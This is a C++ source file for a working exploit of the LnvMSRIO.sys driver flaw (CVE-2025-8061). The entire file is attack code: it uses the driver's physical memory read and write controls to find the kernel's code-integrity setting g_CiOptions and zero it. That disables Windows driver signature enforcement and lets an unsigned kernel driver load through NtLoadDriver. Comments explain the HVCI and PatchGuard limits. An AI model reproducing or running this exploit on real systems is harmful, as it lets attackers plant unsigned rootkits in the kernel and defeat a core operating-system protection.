/*
 * 05_dse_bypass.cpp  —  CVE-2025-8061 (LnvMSRIO.sys) — DSE Bypass
 *
 * Goal: locate CI!g_CiOptions in physical memory and zero it out,
 *       disabling Driver Signature Enforcement so any unsigned .sys
 *       can be loaded via NtLoadDriver / sc start.
 *
 * What is g_CiOptions?
 * ────────────────────
 * CI.DLL (Code Integrity) exports CiInitialize, which stores the current
 * enforcement policy in a global DWORD called g_CiOptions:
 *   0x00  = DSE disabled  (unsigned drivers allowed)
 *   0x06  = DSE enabled   (default — drivers must be signed)
 *   0x08  = CI_OPT_HVCI   (Hypervisor-protected CI — NOT bypassable with phys write)
 *
 * Note on HVCI:
 *   If VBS/HVCI is active, CI code pages are protected by the hypervisor's
 *   Second Level Address Translation (EPT).  Physical writes to those pages
 *   are silently discarded.  This bypass ONLY works when HVCI is OFF.
 *   Check: msinfo32 → "Virtualization-based security" = Not enabled → safe to proceed.
 *
 * Finding g_CiOptions — pattern scan technique
 * ─────────────────────────────────────────────
 * 1. Get ci.dll kernel VA base from NtQuerySystemInformation.
 * 2. Build a KernelRead() helper: VaToPa(cr3, VA) → PhysRead → buffer.
 * 3. Read ci.dll PE headers; locate .text and .data sections.
 * 4. Find export CiInitialize RVA from the Export Directory.
 * 5. Scan CiInitialize bytes for RIP-relative MOV instructions:
 *      8B xx ?? ?? ?? ??   →  MOV reg, [RIP + imm32]  (read  from g_CiOptions)
 *      89 xx ?? ?? ?? ??   →  MOV [RIP + imm32], reg  (write to  g_CiOptions)
 *    where opcode byte 2 encodes ModRM = 0b00_xxx_101 (mod=0, rm=5 = RIP-rel).
 * 6. Compute target VA = instruction_end_VA + sign_extend(imm32).
 * 7. Accept if target is inside ci.dll's .data and current value == 0x06.
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:05_dse_bypass.exe 05_dse_bypass.cpp
 *      /link kernel32.lib
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <algorithm>
using std::min;

// ─── Device ──────────────────────────────────────────────────────────────────

#define DEVICE_NAME       L"\\\\.\\WinMsrDev"
#define IOCTL_PHYS_READ   0x9c406104u
#define IOCTL_PHYS_WRITE  0x9c40a108u

static HANDLE g_dev = INVALID_HANDLE_VALUE;

static bool OpenDevice()
{
    g_dev = CreateFileW(DEVICE_NAME,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile: error %lu\n", GetLastError());
        return false;
    }
    printf("[+] Device opened  handle=%p\n", g_dev);
    return true;
}

// ─── Physical R/W ────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PhysReadIn   { UINT64 PA; DWORD AS; DWORD Count; };
struct PhysWriteIn4 { UINT64 PA; DWORD OT; DWORD AS; DWORD Data; };
#pragma pack(pop)

static bool PhysRead(uint64_t pa, void *buf, DWORD len)
{
    if (!len || len > 4096) return false;
    PhysReadIn in = { pa, 1, len };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), buf, len, &got, nullptr)
           && (got == len);
}

static bool PhysReadU64(uint64_t pa, uint64_t *out)
{
    PhysReadIn in = { pa, 8, 1 };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_READ,
                           &in, sizeof(in), out, 8, &got, nullptr)
           && (got == 8);
}

static bool PhysWriteU32(uint64_t pa, uint32_t val)
{
    PhysWriteIn4 in = { pa, 1, 4, val };
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}

// ─── Page table walk: VA → PA ─────────────────────────────────────────────────

static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    uint64_t pml4_pa = cr3 & ~0xFFFULL;
    auto idx = [&](int s){ return (va >> s) & 0x1FF; };

    uint64_t e = 0;
    if (!PhysReadU64(pml4_pa + idx(39)*8, &e) || !(e&1)) return 0;
    uint64_t p = e & 0x000FFFFFFFFFF000ULL;

    if (!PhysReadU64(p + idx(30)*8, &e) || !(e&1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    p = e & 0x000FFFFFFFFFF000ULL;

    if (!PhysReadU64(p + idx(21)*8, &e) || !(e&1)) return 0;
    if (e & 0x80) return (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    p = e & 0x000FFFFFFFFFF000ULL;

    if (!PhysReadU64(p + idx(12)*8, &e) || !(e&1)) return 0;
    return (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
}

// ─── Kernel VA read (spans page boundaries) ───────────────────────────────────
//
// Translates each page independently — handles code ranges that cross 4 KB
// boundaries (common for large allocations like driver images).

static bool KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t *)buf;
    while (len > 0) {
        uint64_t page_pa = VaToPa(cr3, va & ~0xFFFULL);
        if (!page_pa) return false;
        DWORD off_in_page = (DWORD)(va & 0xFFF);
        DWORD to_read     = min(len, 0x1000u - off_in_page);
        if (!PhysRead(page_pa + off_in_page, dst, to_read)) return false;
        va  += to_read;
        dst += to_read;
        len -= to_read;
    }
    return true;
}

// ─── Get System CR3 ──────────────────────────────────────────────────────────

static uint64_t GetSystemCR3()
{
    uint64_t top = [] {
        MEMORYSTATUSEX ms={sizeof(ms)}; GlobalMemoryStatusEx(&ms);
        return ((ms.ullTotalPhys+(512ULL<<20))+0x1FFFFFULL) & ~0x1FFFFFULL;
    }();
    auto *buf=(uint8_t*)VirtualAlloc(nullptr,1<<20,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if (!buf) return 0;
    uint64_t cr3 = 0;
    for (uint64_t pa=0x100000; pa<top&&!cr3; pa+=1<<20) {
        if (pa>=0xC0000000ULL && pa<0x100000000ULL) continue;
        bool any_ok=false;
        for (DWORD pg=0;pg<(1u<<20);pg+=0x1000){
            if(PhysRead(pa+pg,buf+pg,0x1000)) any_ok=true;
            else memset(buf+pg,0,0x1000);
        }
        if (!any_ok) continue;
        for (DWORD off=0; off+0x5B0<=(1u<<20); off+=8) {
            if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;
            if (_strnicmp((char*)(buf+off+0x5A8),"System",6)!=0) continue;
            uint64_t c = *(uint64_t*)(buf+off+0x28);
            if (c && !(c&0xFFF)) { cr3=c; break; }
        }
    }
    VirtualFree(buf,0,MEM_RELEASE);
    return cr3;
}

// ─── NtQuerySystemInformation: get kernel module info ────────────────────────

struct KM_INFO { uint64_t base; uint32_t size; char name[64]; };

typedef LONG (NTAPI *pfnNtQSI)(ULONG,PVOID,ULONG,PULONG);

static bool GetKernelModule(const char *target, KM_INFO *out)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"),"NtQuerySystemInformation");
    ULONG sz=1<<18;
    auto buf=(uint8_t*)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sz);
    while (NtQSI(11,buf,sz,&sz)==(LONG)0xC0000004)
        buf=(uint8_t*)HeapReAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,buf,sz*=2);

    struct MOD { HANDLE sec; PVOID mbase,imgbase; ULONG size,flags,loi,ioi,lc,oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf+sizeof(ULONG));
    bool found = false;
    for (ULONG i=0;i<n;i++) {
        const char *nm = mods[i].path + mods[i].oft;
        if (_stricmp(nm,target)==0) {
            out->base = (uint64_t)(uintptr_t)mods[i].imgbase;
            out->size = mods[i].size;
            strncpy_s(out->name,sizeof(out->name),nm,63);
            found = true; break;
        }
    }
    HeapFree(GetProcessHeap(),0,buf);
    return found;
}

// ─── PE helper: find export VA ────────────────────────────────────────────────
//
// Reads the Export Directory from `hdr_buf` (first 0x1000 bytes of the module)
// and returns the function VA for the given name.

static uint64_t GetExportVA(uint64_t cr3, uint64_t img_base,
                              const uint8_t *hdr, const char *funcname)
{
    LONG lfanew = *(LONG*)(hdr+0x3C);
    // Optional header + 0x70 = DataDirectory[0] (Export)
    DWORD exp_rva = *(DWORD*)(hdr + lfanew + 0x18 + 0x70);
    if (!exp_rva) return 0;

    // IMAGE_EXPORT_DIRECTORY (40 bytes)
    uint8_t expdir[40] = {};
    if (!KernelRead(cr3, img_base + exp_rva, expdir, sizeof(expdir))) return 0;

    DWORD num_names  = *(DWORD*)(expdir + 0x18);
    DWORD rva_names  = *(DWORD*)(expdir + 0x20);  // AddressOfNames
    DWORD rva_ordinals = *(DWORD*)(expdir + 0x24); // AddressOfNameOrdinals
    DWORD rva_funcs  = *(DWORD*)(expdir + 0x1C);   // AddressOfFunctions

    for (DWORD i = 0; i < num_names; i++) {
        // Read name RVA
        DWORD name_rva = 0;
        KernelRead(cr3, img_base + rva_names + i*4, &name_rva, 4);

        // Read name string
        char nm[64] = {};
        KernelRead(cr3, img_base + name_rva, nm, sizeof(nm)-1);

        if (_stricmp(nm, funcname) != 0) continue;

        // Read ordinal
        WORD ord = 0;
        KernelRead(cr3, img_base + rva_ordinals + i*2, &ord, 2);

        // Read function RVA
        DWORD func_rva = 0;
        KernelRead(cr3, img_base + rva_funcs + ord*4, &func_rva, 4);

        return img_base + func_rva;
    }
    return 0;
}

// ─── Find g_CiOptions VA ──────────────────────────────────────────────────────
//
// Scan the first 1024 bytes of CiInitialize for RIP-relative MOV instructions
// that reference a DWORD in ci.dll's .data section with value == 0x06.
//
// Targeted patterns (6-byte encoding):
//   8B [05|0D|15|1D|25|2D|35|3D]  imm32  →  MOV reg, [RIP+imm32]
//   89 [05|0D|15|1D|25|2D|35|3D]  imm32  →  MOV [RIP+imm32], reg
//
// The ModRM byte encodes mod=00, rm=101 (RIP-relative when mod=00/rm=5).
// mod=00 means bits[7:6]=00; rm=101 means bits[2:0]=101.
// Combined: (modrm & 0xC7) == 0x05.

static bool IsRipRelModRM(uint8_t modrm) { return (modrm & 0xC7) == 0x05; }

static uint64_t FindCiOptions(uint64_t cr3, uint64_t ci_base,
                               uint64_t data_va, uint32_t data_size,
                               uint64_t ci_init_va)
{
    // Read 1 KB of CiInitialize
    uint8_t func[1024] = {};
    if (!KernelRead(cr3, ci_init_va, func, sizeof(func))) {
        printf("[-] KernelRead(CiInitialize) failed\n");
        return 0;
    }

    printf("    [scan] CiInitialize @ 0x%016llX — scanning %zu bytes\n",
           ci_init_va, sizeof(func));

    for (int i = 0; i < (int)sizeof(func) - 6; i++) {
        uint8_t op     = func[i];
        uint8_t modrm  = func[i+1];

        // Only 8B xx and 89 xx with RIP-relative ModRM
        if (op != 0x8B && op != 0x89) continue;
        if (!IsRipRelModRM(modrm))     continue;

        // Compute target VA:  RIP after instruction (i+6) + sign-extended imm32
        int32_t  imm32     = *(int32_t *)(func + i + 2);
        uint64_t target_va = ci_init_va + i + 6 + (int64_t)imm32;

        // Must be inside ci.dll .data section
        if (target_va < data_va || target_va + 4 > data_va + data_size) continue;

        // Read current value at that address
        uint32_t val = 0xDEAD;
        KernelRead(cr3, target_va, &val, 4);

        printf("    [+%03X] op=%02X modrm=%02X  target=0x%016llX  value=0x%08X",
               i, op, modrm, target_va, val);

        // g_CiOptions is 0x06 when DSE is on (normal boot)
        // 0x08 = HVCI (not bypassable); 0x0E = both
        if (val == 0x06 || val == 0x08 || val == 0x0E || val == 0x00) {
            printf("  ← g_CiOptions candidate!\n");
            if (val == 0x06) return target_va;  // prefer the DSE-on case
        } else {
            printf("\n");
        }
    }
    return 0;
}

// ─── NtLoadDriver helper ──────────────────────────────────────────────────────
//
// NtLoadDriver takes a registry path to a service key that must have:
//   Type       = 1  (SERVICE_KERNEL_DRIVER)
//   Start      = 3  (SERVICE_DEMAND_START)
//   ErrorControl = 1
//   ImagePath  = \??\<abs path to .sys>
//
// We create this key, call NtLoadDriver, then clean up.

typedef LONG (NTAPI *pfnNtLd)(PUNICODE_STRING);

static bool TryLoadDriver(const wchar_t *svcName, const wchar_t *sysPath)
{
    // Build registry key path
    wchar_t regPath[512];
    swprintf_s(regPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\%s",
               svcName);

    // Create key
    wchar_t regPathWin[512];
    swprintf_s(regPathWin, L"SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    HKEY hKey = nullptr;
    DWORD disp = 0;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPathWin, 0, nullptr, 0,
                        KEY_ALL_ACCESS, nullptr, &hKey, &disp) != ERROR_SUCCESS) {
        printf("[-] RegCreateKeyEx failed: %lu\n", GetLastError());
        return false;
    }

    // Set required values
    DWORD v = 1; RegSetValueExW(hKey, L"Type",         0, REG_DWORD, (BYTE*)&v, 4);
    v = 3;       RegSetValueExW(hKey, L"Start",        0, REG_DWORD, (BYTE*)&v, 4);
    v = 1;       RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&v, 4);

    // ImagePath must use \??\ prefix
    wchar_t imgPath[512];
    swprintf_s(imgPath, L"\\??\\%s", sysPath);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
                   (BYTE*)imgPath, (DWORD)((wcslen(imgPath)+1)*sizeof(wchar_t)));
    RegCloseKey(hKey);

    // Call NtLoadDriver
    auto NtLd = (pfnNtLd)GetProcAddress(GetModuleHandleA("ntdll"), "NtLoadDriver");
    if (!NtLd) { printf("[-] NtLoadDriver not found\n"); return false; }

    UNICODE_STRING us;
    us.Buffer        = regPath;
    us.Length        = (USHORT)(wcslen(regPath) * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);

    LONG st = NtLd(&us);
    printf("    NtLoadDriver(\"%ls\") = 0x%08X  %s\n",
           sysPath, (unsigned)st,
           st == 0 ? "SUCCESS — unsigned driver loaded!" :
           st == (LONG)0xC0000603 ? "BLOCKED — DSE still active" :
           st == (LONG)0xC0000428 ? "BLOCKED — invalid image signature (DSE)" : "other");

    // Cleanup registry key regardless
    RegDeleteKeyW(HKEY_LOCAL_MACHINE, regPathWin);
    return (st == 0);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char **argv)
{
    printf("=== CVE-2025-8061 | LnvMSRIO.sys | 05 - DSE Bypass ===\n\n");

    if (!OpenDevice()) return 1;

    // ── Step 1: get ci.dll info ───────────────────────────────────────────────
    KM_INFO ci = {};
    if (!GetKernelModule("CI.dll", &ci) && !GetKernelModule("ci.dll", &ci)) {
        printf("[-] ci.dll not found in module list\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] ci.dll  base=0x%016llX  size=0x%X\n\n", ci.base, ci.size);

    // ── Step 2: get System CR3 ────────────────────────────────────────────────
    printf("[*] Getting System CR3...\n");
    uint64_t cr3 = GetSystemCR3();
    if (!cr3) {
        printf("[-] System CR3 not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] System CR3 = 0x%016llX\n\n", cr3);

    // ── Step 3: read ci.dll PE headers ───────────────────────────────────────
    uint8_t hdr[0x1000] = {};
    if (!KernelRead(cr3, ci.base, hdr, sizeof(hdr))) {
        printf("[-] KernelRead(ci.dll header) failed\n");
        CloseHandle(g_dev); return 1;
    }
    if (hdr[0]!='M'||hdr[1]!='Z') { printf("[-] ci.dll MZ mismatch\n"); return 1; }

    LONG lfanew = *(LONG*)(hdr+0x3C);
    WORD nsec   = *(WORD*)(hdr + lfanew + 6);  // NumberOfSections
    printf("[+] ci.dll MZ OK  e_lfanew=0x%X  sections=%u\n", lfanew, nsec);

    // ── Step 4: find .data section bounds ────────────────────────────────────
    //
    // IMAGE_SECTION_HEADER starts at: lfanew + 4 (PE sig) + 0x14 (COFF) + 0xF0 (opt64)
    // Each section header = 40 bytes.
    // We look for the section named ".data".

    uint64_t data_va   = 0;
    uint32_t data_size = 0;

    DWORD sec_tbl_off = lfanew + 4 + 0x14 + 0xF0;  // for PE32+ (SizeOfOptionalHeader=0xF0)
    // Double-check OptionalHeader size
    WORD opt_sz = *(WORD*)(hdr + lfanew + 4 + 0x10);
    sec_tbl_off = lfanew + 4 + 0x14 + opt_sz;

    for (WORD s = 0; s < nsec && s < 16; s++) {
        DWORD off = sec_tbl_off + s * 40;
        if (off + 40 > sizeof(hdr)) break;
        const char *name = (const char*)(hdr + off);          // 8-byte name
        DWORD vsize = *(DWORD*)(hdr + off + 0x08);
        DWORD vrva  = *(DWORD*)(hdr + off + 0x0C);
        DWORD chars = *(DWORD*)(hdr + off + 0x24);

        printf("    section %-8.8s  RVA=0x%08X  vsize=0x%X  flags=0x%08X\n",
               name, vrva, vsize, chars);

        // .data: writable, non-executable
        if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
            data_va   = ci.base + vrva;
            data_size = vsize;
        }
    }

    if (!data_va) {
        printf("[-] .data section not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("\n[+] ci.dll .data: VA=0x%016llX  size=0x%X\n\n", data_va, data_size);

    // ── Step 5: find CiInitialize export ─────────────────────────────────────
    printf("[*] Resolving CiInitialize export...\n");
    uint64_t ci_init_va = GetExportVA(cr3, ci.base, hdr, "CiInitialize");
    if (!ci_init_va) {
        printf("[-] CiInitialize export not found\n");
        CloseHandle(g_dev); return 1;
    }
    printf("[+] CiInitialize VA = 0x%016llX  (+0x%llX)\n\n",
           ci_init_va, ci_init_va - ci.base);

    // ── Step 6: pattern-scan for g_CiOptions ─────────────────────────────────
    printf("[*] Scanning CiInitialize for g_CiOptions reference...\n");
    uint64_t g_CiOptions_va = FindCiOptions(cr3, ci.base,
                                              data_va, data_size,
                                              ci_init_va);
    if (!g_CiOptions_va) {
        printf("[-] g_CiOptions not found via CiInitialize scan\n");
        printf("    Fallback: scanning entire .data for DWORD == 0x06...\n");

        // Fallback: read entire .data and look for 0x00000006
        uint32_t dsz = min(data_size, 0x4000u);
        auto dbuf = (uint8_t*)VirtualAlloc(nullptr, dsz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        KernelRead(cr3, data_va, dbuf, dsz);
        for (uint32_t i = 0; i + 4 <= dsz; i += 4) {
            if (*(uint32_t*)(dbuf+i) == 6) {
                printf("    Candidate at .data+0x%X  VA=0x%016llX\n", i, data_va+i);
                g_CiOptions_va = data_va + i;
                break;
            }
        }
        VirtualFree(dbuf, 0, MEM_RELEASE);
    }

    if (!g_CiOptions_va) {
        printf("[-] g_CiOptions not located\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 7: read original value + check for HVCI ─────────────────────────
    uint64_t ci_options_pa = VaToPa(cr3, g_CiOptions_va);
    if (!ci_options_pa) {
        printf("[-] VaToPa(g_CiOptions) failed — page not present?\n");
        CloseHandle(g_dev); return 1;
    }

    uint32_t orig_val = 0xDEAD;
    PhysRead(ci_options_pa, &orig_val, 4);

    printf("\n[+] g_CiOptions @ VA=0x%016llX  PA=0x%016llX\n",
           g_CiOptions_va, ci_options_pa);
    printf("    Value (before) = 0x%08X", orig_val);

    switch (orig_val) {
    case 0x00: printf("  (DSE already disabled)\n"); break;
    case 0x06: printf("  (DSE enabled — normal)\n"); break;
    case 0x08: printf("  (HVCI — NOT bypassable with physical write!)\n"); break;
    case 0x0E: printf("  (DSE + HVCI — NOT bypassable)\n"); break;
    default:   printf("  (unknown value)\n"); break;
    }

    if (orig_val & 0x08) {
        printf("\n[!] HVCI is active. Physical writes to ci.dll pages are discarded\n");
        printf("    by the hypervisor's EPT. This technique CANNOT bypass HVCI.\n");
        printf("    Disable VBS in BIOS/msinfo32 first.\n");
        CloseHandle(g_dev); return 1;
    }

    if (orig_val == 0x00) {
        printf("    DSE already disabled — nothing to do.\n");
        CloseHandle(g_dev); return 0;
    }

    // ── Step 8: zero g_CiOptions ──────────────────────────────────────────────
    printf("\n[*] Writing 0x00 to g_CiOptions...\n");
    if (!PhysWriteU32(ci_options_pa, 0x00)) {
        printf("[-] PhysWriteU32 failed: %lu\n", GetLastError());
        CloseHandle(g_dev); return 1;
    }

    uint32_t after_val = 0xDEAD;
    PhysRead(ci_options_pa, &after_val, 4);
    printf("    Value (after)  = 0x%08X  %s\n",
           after_val, after_val == 0 ? "[DSE DISABLED ✓]" : "[write did not stick]");

    if (after_val != 0x00) {
        printf("[-] Write failed\n");
        CloseHandle(g_dev); return 1;
    }

    // ── Step 9: prove DSE is disabled via NtLoadDriver ────────────────────────
    //
    // Load a driver that is NOT signed (or has an invalid/stripped signature).
    // Provide path as argument, or use a default test path.
    //
    // Usage:  05_dse_bypass.exe  C:\path\to\unsigned.sys
    //
    // To create a minimal unsigned test driver, compile a .sys with no
    // embedded signature (just omit the signing step in build).

    const wchar_t *test_sys = nullptr;
    wchar_t        arg_path[MAX_PATH] = {};

    if (argc >= 2) {
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, arg_path, MAX_PATH);
        test_sys = arg_path;
    }

    if (test_sys && GetFileAttributesW(test_sys) != INVALID_FILE_ATTRIBUTES) {
        printf("\n[*] Testing NtLoadDriver with: %ls\n", test_sys);
        TryLoadDriver(L"DseTestDrv", test_sys);
    } else {
        printf("\n[*] No test driver path given (or file not found).\n");
        printf("    Usage: 05_dse_bypass.exe C:\\path\\to\\unsigned.sys\n");
        printf("    DSE is now DISABLED — NtLoadDriver will accept unsigned drivers.\n");
        printf("    Load your driver while g_CiOptions == 0, then we restore.\n");
        printf("    Press Enter when done...\n");
        getchar();
    }

    // ── Step 10: RESTORE g_CiOptions ──────────────────────────────────────────
    //
    // Critical: restore IMMEDIATELY after use.
    // Leaving DSE disabled makes the system exploitable by anything that can
    // drop a .sys file. Also: PatchGuard (KPP) will eventually detect the
    // modification and trigger a 0x109 bugcheck.
    // Window is typically seconds to a few minutes before KPP fires.

    printf("\n[*] Restoring g_CiOptions (0x%08X)...\n", orig_val);
    PhysWriteU32(ci_options_pa, orig_val);
    uint32_t restored = 0xDEAD;
    PhysRead(ci_options_pa, &restored, 4);
    printf("    Value (restored) = 0x%08X  %s\n\n",
           restored,
           restored == orig_val ? "[OK ✓  — DSE re-enabled]"
                                 : "[FAILED — reboot immediately]");

    CloseHandle(g_dev);
    printf("[+] Done.\n");
    return 0;
}
